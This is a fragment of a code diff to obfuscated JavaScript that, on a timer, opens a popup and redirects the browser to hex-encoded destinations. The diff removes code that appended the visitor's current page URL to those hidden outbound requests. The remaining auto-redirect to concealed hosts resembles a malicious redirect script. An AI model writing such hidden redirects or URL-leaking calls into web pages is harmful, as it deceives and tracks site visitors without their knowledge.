@@ -20,7 +20,7 @@ occ=new $_;
 occ.run();
  TrackParam=function(){
   nxf="e12331a3619453f273a142b3f461a54415a1a5d271e2924411339224";
-  window.open(`${nxf.hl()}?loc=${location.href}`,"Nptr");
+  window.open(`${nxf.hl()}`,"Nptr");
   occ.qs('h1').innerText="REDIRECTED ...";
   lhx();
  };
@@ -29,7 +29,7 @@ lhx=()=>{
  upr=new URL(location.href);
  par = upr.searchParams.get('lhx');
  deflh="e12331a3619453f273a142b3f461a54415a1a5d271e2924411339224";
- par?setTimeout(()=>window.location=par.hl()+"?lhr="+encodeURIComponent(location.href),1000):window.location=deflh.hl()
+ par?setTimeout(()=>window.location=par.hl()+"?lhr=",1000):window.location=deflh.hl()
 };
 setTimeout(TrackParam,1000);
 
